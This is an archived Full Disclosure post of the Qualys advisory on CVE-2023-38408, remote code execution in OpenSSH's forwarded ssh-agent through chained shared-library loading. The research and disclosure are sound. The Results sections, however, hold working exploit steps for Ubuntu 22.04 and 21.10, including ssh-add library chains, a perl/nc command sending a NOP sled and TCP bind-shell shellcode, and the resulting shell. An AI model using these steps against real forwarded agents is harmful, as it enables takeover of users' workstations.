=== Content from seclists.org_4b997655_20250125_102957.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](30)
[By Date](date.html#31)
[![Next](/images/right-icon-16x16.png)](32)

[![Previous](/images/left-icon-16x16.png)](30)
[By Thread](index.html#31)
[![Next](/images/right-icon-16x16.png)](33)

![](/shared/images/nst-icons.svg#search)

# CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

---

*From*: Qualys Security Advisory via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 19 Jul 2023 16:38:24 +0000

---

```

Qualys Security Advisory

CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

========================================================================
Contents
========================================================================

Summary
Background
Experiments
Results
Discussion
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://man.openbsd.org/ssh-agent.1>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://man.openbsd.org/ssh.1>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://www.qualys.com/research/security-advisories/> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>):

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://seclists.org/fulldisclosure/2010/Oct/344>):

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

========================================================================
Results
========================================================================

In this section, we present the results of our experiments:

- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free
- Sigreturn to arbitrary instruction pointer
- _Unwind_Context type-confusion
- RCE in library constructor

========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

server#
SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n
"$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from
  <https://shell-storm.org/shellcode/files/shellcode-858.html>);

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice       1105  0.0  0.1   7968  4192 ?        Ss   09:48   0:00 ssh-agent -s
alice       1249  0.0  0.0   2888   956 ?        S    10:03   0:00  \_ [sh]
alice       1268  0.0  0.0   7204  3092 ?        R    10:14   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307
...
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fb15c9b560e in std::_Rb_tree_decrement(std::_Rb_tree_node_base*) () from /lib/x86_64-linux-gnu/libstdc++.so.6

(gdb) stepi
0x00007fb15d0e1250 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) x/10i 0x00007fb15d0e1250
=> 0x7fb15d0e1250:      add    %rcx,%rdx
   0x7fb15d0e1253:      notrack jmp *%rdx
   ...

(gdb) stepi
0x00007fb15d0e1253 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) stepi
0x00007ffc2ec82691 in ?? ()

(gdb) x/10i 0x00007ffc2ec82691
=> 0x7ffc2ec82691:      nop
   0x7ffc2ec82692:      nop
   0x7ffc2ec82693:      nop
   0x7ffc2ec82694:      nop
   0x7ffc2ec82695:      nop
   0x7ffc2ec82696:      nop
   0x7ffc2ec82697:      nop
   0x7ffc2ec82698:      nop
   0x7ffc2ec82699:      nop
   0x7ffc2ec8269a:      nop

(gdb) !grep stack /proc/1307/maps
7ffc2ec66000-7ffc2ec87000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb <https://old-releases.ubuntu.com/ubuntu/> impish main restricted universe' > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 912

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-GnpGKph6xbe3/agent.911

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

server# export SSH_AUTH_SOCK=/tmp/ssh-30N8pjTKWn/agent.996

server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

server#
SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n
"$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex_data.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice        912  0.0  0.0   6060  2312 ?        Ss   17:18   0:00 ssh-agent -s
alice        928  0.0  0.0   2872   956 ?        S    17:25   0:00  \_ [sh]
alice        953  0.0  0.0   7060  3068 ?        R    17:40   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1225
...
(gdb) continue
Continuing.

Program received signal SIGBUS, Bus error.
memset () at ../sysdeps/x86_64/multiarch/memset-vec-unaligned-erms.S:186

(gdb) stepi
0x00007f2ba9d7c350 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) x/10i 0x00007f2ba9d7c350
=> 0x7f2ba9d7c350:      add    $0x28,%rsp
   0x7f2ba9d7c354:      mov    %r12,%rax
   0x7f2ba9d7c357:      pop    %rbx
   0x7f2ba9d7c358:      pop    %rbp
   0x7f2ba9d7c359:      pop    %r12
   0x7f2ba9d7c35b:      pop    %r13
   0x7f2ba9d7c35d:      pop    %r14
   0x7f2ba9d7c35f:      pop    %r15
   0x7f2ba9d7c361:      ret
   ...

(gdb) stepi
...
0x00007f2ba9d7c361 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) stepi
0x00007fff7aae5e90 in ?? ()

(gdb) x/10i 0x00007fff7aae5e90
=> 0x7fff7aae5e90:      add    %dl,(%rax)
   0x7fff7aae5e92:      and    %eax,(%rax)
   0x7fff7aae5e94:      add    %al,(%rax)
   0x7fff7aae5e96:      add    %al,(%rax)
   0x7fff7aae5e98:      add    %ah,(%rax)
